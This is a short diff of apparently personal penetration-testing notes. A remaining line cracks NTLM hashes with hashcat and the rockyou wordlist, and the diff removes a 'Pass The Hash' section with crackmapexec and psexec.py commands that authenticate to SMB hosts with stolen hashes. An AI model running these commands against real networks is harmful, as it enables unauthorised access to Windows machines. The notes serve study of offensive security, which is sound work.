@@ -31,16 +31,3 @@ NOTE: NTLM password Hashes can be passed over network, but not NTLMv2.
 > hashcat -m 1000 <hashfile: hashes4.txt> <passwordfile: rockyou.txt> -O
 ```
 
-# Pass The Hash
-
-We can pass the hash instead of trying to crack it.
-
-## Crackmapexec
-```sh
-> crackmapexec smb 192.168.1.0/24 -u "<Username>" -H "<PasswordHash>" --local-auth
-```
-
-## psexec.py 
-```sh
-> psexec.py <username: "frank castle":@<IP Address -hashes <LM:NT>  
-```
